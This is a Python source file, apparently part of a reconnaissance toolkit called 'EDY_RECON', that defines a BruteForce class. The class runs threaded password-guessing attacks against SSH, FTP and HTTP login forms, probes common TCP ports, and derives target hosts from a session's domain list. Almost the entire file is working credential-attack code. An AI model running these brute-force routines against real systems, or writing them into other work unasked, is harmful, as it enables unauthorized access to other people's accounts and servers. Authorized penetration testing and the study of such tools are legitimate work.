import socket
import time
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait

import requests

from modules import EDY_RECON_VERSION


class BruteForce:
    def __init__(self, cfg, pwman, theme="NEO", log_cb=None):
        self.cfg = cfg
        self.pwman = pwman
        self.theme = theme
        self.log_cb = log_cb
        self.found = []
        self.attempts = 0
        self._stop = False

    def _log(self, msg, role="secondary"):
        if self.log_cb:
            self.log_cb(msg, role)
        else:
            print(msg)

    def _try_ssh(self, host, port, user, pw, timeout):
        try:
            import paramiko
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(host, port=port, username=user, password=pw, timeout=timeout,
                      allow_agent=False, look_for_keys=False, banner_timeout=timeout,
                      auth_timeout=timeout)
            c.close()
            return user, pw
        except Exception:
            return None

    def _run_bounded(self, attempts, worker, threads, delay=0):
        """Mantém no máximo uma tarefa por worker e cancela ao primeiro sucesso."""
        threads = max(1, min(int(threads), 32))
        iterator = iter(attempts)
        pending = {}
        executor = ThreadPoolExecutor(max_workers=threads)

        def submit_one():
            if self._stop:
                return False
            try:
                args = next(iterator)
            except StopIteration:
                return False
            future = executor.submit(worker, *args)
            pending[future] = args
            if delay:
                time.sleep(max(0.0, float(delay)))
            return True

        try:
            for _ in range(threads):
                if not submit_one():
                    break
            while pending and not self._stop:
                completed, _ = wait(tuple(pending), return_when=FIRST_COMPLETED)
                for future in completed:
                    pending.pop(future, None)
                    self.attempts += 1
                    result = future.result()
                    if result:
                        self._stop = True
                        for queued in pending:
                            queued.cancel()
                        return result
                    if not submit_one():
                        continue
            return None
        finally:
            executor.shutdown(wait=True, cancel_futures=True)

    def ssh(self, host, port, usernames, passwords, threads=None, delay=None, timeout=None):
        threads = threads or self.cfg.cfg.get("bruteforce", {}).get("threads", 8)
        delay = self.cfg.cfg.get("bruteforce", {}).get("delay", 0.4) if delay is None else delay
        timeout = self.cfg.cfg.get("bruteforce", {}).get("timeout", 10) if timeout is None else timeout
        attempts = ((host, port, user, password, timeout) for user in usernames for password in passwords)
        result = self._run_bounded(attempts, self._try_ssh, threads, delay)
        if result:
            self.found.append((host, port, "SSH", result[0], "***"))
        return self.found

    def _try_ftp(self, host, port, user, pw, timeout):
        import ftplib
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(user, pw)
            ftp.quit()
            return user, pw
        except ftplib.error_perm:
            return None
        except Exception:
            return None

    def ftp(self, host, port, usernames, passwords, threads=None, delay=None, timeout=None):
        threads = threads or self.cfg.cfg.get("bruteforce", {}).get("threads", 8)
        delay = self.cfg.cfg.get("bruteforce", {}).get("delay", 0.4) if delay is None else delay
        timeout = self.cfg.cfg.get("bruteforce", {}).get("timeout", 10) if timeout is None else timeout
        attempts = ((host, port, user, password, timeout) for user in usernames for password in passwords)
        result = self._run_bounded(attempts, self._try_ftp, threads, delay)
        if result:
            self.found.append((host, port, "FTP", result[0], "***"))
        return self.found

    def http_form(self, url, method, fields, usernames, passwords, ok_marker=None,
                  fail_marker=None, threads=None, delay=None, timeout=None):
        threads = threads or self.cfg.cfg.get("bruteforce", {}).get("threads", 8)
        timeout = self.cfg.cfg.get("bruteforce", {}).get("timeout", 10) if timeout is None else timeout
        ok_marker = ok_marker or "logout"
        fail_marker = fail_marker or ("invalid" if not fail_marker else fail_marker)
        def attempt(user, pw):
            s = requests.Session()
            s.headers.update({"User-Agent": f"Mozilla/5.0 EDYRECON/{EDY_RECON_VERSION}"})
            data = {}
            for k, v in fields.items():
                if isinstance(v, str):
                    v = v.replace("{user}", user).replace("{pass}", pw).replace("{password}", pw)
                data[k] = v
            try:
                if method.upper() == "GET":
                    r = s.get(url, params=data, timeout=timeout, allow_redirects=True)
                else:
                    r = s.post(url, data=data, timeout=timeout, allow_redirects=True)
                text = r.text.lower()
                if ok_marker and ok_marker.lower() in text and (not fail_marker or fail_marker.lower() not in text):
                    return (user, pw, r.status_code)
                if not ok_marker and fail_marker and fail_marker.lower() not in text:
                    return (user, pw, r.status_code)
            except Exception:
                return None
            return None

        delay = self.cfg.cfg.get("bruteforce", {}).get("delay", 0.4) if delay is None else delay
        attempts = ((user, password) for user in usernames for password in passwords)
        result = self._run_bounded(attempts, attempt, threads, delay)
        if result:
            self.found.append((url, None, "HTTP-FORM", result[0], "***"))
        return self.found

    def probe_ports(self, host, ports=None, timeout=2):
        ports = ports or [22, 21, 80, 443, 8080, 8443]
        open_ports = []
        for p in ports:
            try:
                with socket.create_connection((host, p), timeout=timeout):
                    open_ports.append(p)
            except Exception:
                continue
        return open_ports

    def derive_targets(self, session):
        domains = set()
        for t in session.get("targets", []):
            for d in t.get("domains", []):
                if isinstance(d, dict):
                    d = d.get("domain")
                if d:
                    domains.add(str(d).strip().lower())
            for d in t.get("dominios", []):
                if isinstance(d, dict):
                    d = d.get("domain")
                if d:
                    domains.add(str(d).strip().lower())
        targets = []
        for d in domains:
            try:
                host = socket.gethostbyname(d)
            except Exception:
                host = d
            ports = self.probe_ports(d)
            if ports:
                targets.append({"domain": d, "host": host, "ports": ports})
        return targets
